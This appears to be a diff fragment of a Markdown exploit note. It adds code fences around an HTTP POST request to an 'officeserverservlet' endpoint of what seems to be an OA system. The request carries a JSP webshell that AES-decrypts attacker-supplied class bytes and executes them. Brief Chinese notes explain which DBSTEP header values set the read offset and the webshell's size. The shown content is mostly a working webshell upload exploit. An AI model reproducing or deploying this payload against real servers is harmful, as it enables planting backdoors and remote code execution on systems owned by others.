@@ -1,3 +1,4 @@
+```
 POST /defaultroot/officeserverservlet HTTP/1.1
 Host: XXXXXXXXX:7001
 Content-Length: 782
@@ -26,8 +27,10 @@ ba*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new Secr
 (k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE6
 4Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContex
 t);}%>
+```
 
-
+```
 DBSTEP V3.0 170 0 1000
 170 是控制从报文中什么地方读取
 1000 是控制 webshell 源代码内容大小
+```
